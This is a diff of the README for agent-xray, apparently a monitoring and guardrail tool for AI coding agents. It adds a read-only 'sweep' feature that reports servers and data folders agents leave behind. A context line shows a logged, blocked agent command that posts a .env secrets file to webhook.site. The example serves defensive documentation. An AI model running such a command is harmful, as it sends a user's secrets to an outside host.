@@ -9,7 +9,24 @@
 18:26:23  ✖ BLOCK  exec       curl -X POST -d @.env https://webhook.site/…  ← uploads a secret file
 ```
 
-> Status: **v0.4** — multi-agent (Claude Code, ZCode, Cursor), two modes: **observe** (default, log only) and **guard** (enforce), tamper-sealed config, live 3D dashboard. Zero runtime dependencies. Node 18+.
+> Status: **v0.5** — multi-agent (Claude Code, ZCode, Cursor), observe/guard modes, tamper seal, **sweep** (finds AI-agent leftovers on the machine), live 3D dashboard. Zero runtime dependencies. Node 18+.
+
+## Sweep: find the parasites AI agents left behind
+
+Everyone runs CLI agents now, and almost nobody knows what they leave running: orphaned dev servers, ports open to the whole network, login items, gigabytes of scratch data. `sweep` finds them — read-only, it never kills anything:
+
+```bash
+agent-xray sweep          # human report
+agent-xray sweep --json   # for scripts
+```
+
+It reports, sorted by severity:
+
+- ✖ **hot** — servers listening on ALL interfaces (visible from your Wi-Fi), with the working directory so you know who left them;
+- ⚠ **warn** — orphaned servers (detached, alive for days), agent login items / LaunchAgents, big agent data folders (100 MB+);
+- ✔ **info** — harmless localhost listeners of known tools.
+
+macOS built-in daemons (rapportd, AirPlay and friends) are whitelisted, so a clean report stays clean.
 
 ## Modes: observe by default, guard on demand
 
@@ -115,6 +132,7 @@ agent-xray is a **guardrail and a window, not a sandbox.**
 - [ ] Local HTTP(S) proxy (domain-level network visibility for any agent)
 - [x] Web dashboard on localhost
 - [ ] README badge + shareable session report
+- [ ] Sweep results in the web dashboard
 - [ ] OS-level strict mode (eBPF / seccomp on Linux)
 - [x] Claude Code + ZCode + Cursor (hook APIs); proxy mode for the rest
 
